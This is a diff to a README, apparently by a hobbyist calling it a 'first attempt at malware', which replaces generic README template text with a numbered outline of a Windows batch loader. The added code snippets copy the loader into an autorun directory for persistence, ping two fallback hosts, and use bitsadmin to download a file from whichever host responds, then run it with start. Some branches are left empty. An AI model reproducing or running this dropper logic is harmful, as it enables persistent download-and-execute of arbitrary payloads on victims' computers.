@@ -4,38 +4,61 @@ first attempt at malware?
 ### PoC
 actually more of a how-it-works but PoC sounds cooler sooo
 
-```markdown
-# Project Name
+1. Check if loader is in autorun
+```
+if not exist "%directory%\%name%" (
 
-## Simple README Template
-
-### Description
-This repository serves as a template for creating a simple README file. A README is essential for providing basic information about your project, making it more accessible to others.
-
-### Proof of Concept (PoC)
-To use this template, simply copy and paste the following structure into your own README file and replace the placeholder text with your project details.
-
-```markdown
-# Your Project Name
-
-## Description
-Provide a brief description of your project here.
-
-## Installation
-Describe the installation process, if any, in this section.
-
-## Usage
-Explain how to use your project after installation.
-
-## Contributing
-Provide guidelines for others to contribute to your project.
-
-## License
-Specify the license for your project (if applicable).
+) else (
+ 
+)
 ```
 
-Feel free to customize the template based on your project's specific needs.
+2. if not move there and try again
+```
+move "%path%" "%directory%"
+call "%directory%\%name%"
 ```
 
+3. if yes check if website a is online
+```
+ping -n 1 %a% >nul
+if %errorlevel% equ 0 (
+    
+) else (
+    
+)
+```
 
-Feel free to copy and modify this template for your project. Add or remove sections as needed.
+4. if website a is offline check website b
+```
+ping -n 1 %b% >nul
+if %errorlevel% equ 0 (
+    
+) else (
+    
+)
+```
+
+5. if website b is offline give up
+```
+echo static is broken.
+```
+
+6. if website b is online get the file and run it
+```
+bitsadmin /transfer downloadB /download /priority high %b% %d%
+start %d%
+```
+
+7. if website a is online get the file and run it
+```
+bitsadmin /transfer downloadB /download /priority high %a% %c%
+start %c%
+```
+
+### that took a while btw
+
+
+
+
+
